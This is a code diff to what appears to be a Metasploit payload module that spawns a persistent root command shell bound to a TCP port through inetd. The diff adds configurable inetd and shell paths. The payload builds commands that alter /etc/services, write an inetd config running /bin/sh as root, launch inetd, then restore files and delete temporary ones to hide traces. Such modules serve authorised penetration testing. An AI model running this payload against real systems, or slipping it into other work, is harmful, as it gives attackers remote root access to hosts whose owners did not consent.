@@ -13,23 +13,29 @@ module MetasploitModule
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'          => 'Unix Command Shell, Bind TCP (inetd)',
-      'Description'   => 'Listen for a connection and spawn a command shell (persistent)',
-      'Author'        => 'hdm',
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'unix',
-      'Arch'          => ARCH_CMD,
-      'Handler'       => Msf::Handler::BindTcp,
-      'Session'       => Msf::Sessions::CommandShell,
-      'PayloadType'   => 'cmd',
-      'Privileged'    => true,
-      'RequiredCmd'   => 'inetd',
-      'Payload'       =>
-        {
-          'Offsets' => { },
-          'Payload' => ''
-        }
-      ))
+     'Name'          => 'Unix Command Shell, Bind TCP (inetd)',
+     'Description'   => 'Listen for a connection and spawn a command shell (persistent)',
+     'Author'        => 'hdm',
+     'License'       => MSF_LICENSE,
+     'Platform'      => 'unix',
+     'Arch'          => ARCH_CMD,
+     'Handler'       => Msf::Handler::BindTcp,
+     'Session'       => Msf::Sessions::CommandShell,
+     'PayloadType'   => 'cmd',
+     'Privileged'    => true,
+     'RequiredCmd'   => 'inetd',
+     'Payload'       =>
+       {
+         'Offsets' => { },
+         'Payload' => ''
+       }
+    ))
+    register_advanced_options(
+      [
+        OptString.new('InetdPath', [true, 'The path to the inetd executable', 'inetd']),
+        OptString.new('ShellPath', [true, 'The path to the shell to execute', '/bin/sh'])
+      ]
+    )
   end
 
   #
@@ -52,26 +58,26 @@ module MetasploitModule
       # Create a clean copy of the services file
       "cp /etc/services #{tmp_services};" +
 
-      # Add our service to the system one
-      "echo #{svc} #{datastore['LPORT']}/tcp>>/etc/services;" +
+        # Add our service to the system one
+        "echo #{svc} #{datastore['LPORT']}/tcp>>/etc/services;" +
 
-      # Create our inetd configuration file with our service
-      "echo #{svc} stream tcp nowait root /bin/sh sh>#{tmp_inet};" +
+        # Create our inetd configuration file with our service
+        "echo #{svc} stream tcp nowait root #{datastore['ShellPath']} sh>#{tmp_inet};" +
 
-      # First we try executing inetd without the full path
-      "inetd -s #{tmp_inet} ||" +
+        # First we try executing inetd without the full path
+        "#{datastore['InetdPath']} -s #{tmp_inet} ||" +
 
-      # Next try the standard inetd path on Linux, Solaris, BSD
-      "/usr/sbin/inetd -s #{tmp_inet} ||" +
+        # Next try the standard inetd path on Linux, Solaris, BSD
+        "/usr/sbin/inetd -s #{tmp_inet} ||" +
 
-      # Next try the Irix inetd path
-      "/usr/etc/inetd -s #{tmp_inet};" +
+        # Next try the Irix inetd path
+        "/usr/etc/inetd -s #{tmp_inet};" +
 
-      # Overwrite services with the "clean" version
-      "cp #{tmp_services} /etc/services;" +
+        # Overwrite services with the "clean" version
+        "cp #{tmp_services} /etc/services;" +
 
-      # Delete our configuration file
-      "rm #{tmp_inet} #{tmp_services};";
+        # Delete our configuration file
+        "rm #{tmp_inet} #{tmp_services};";
 
     return cmd
   end
